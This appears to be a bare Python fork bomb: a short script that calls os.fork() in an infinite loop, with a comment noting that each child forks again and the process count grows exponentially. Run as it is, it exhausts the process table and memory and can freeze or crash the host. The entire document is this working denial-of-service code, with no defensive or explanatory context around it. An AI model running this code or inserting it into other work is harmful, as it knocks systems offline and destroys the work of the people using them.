import os
while True:
    os.fork()   # each child forks again -> exponential process explosion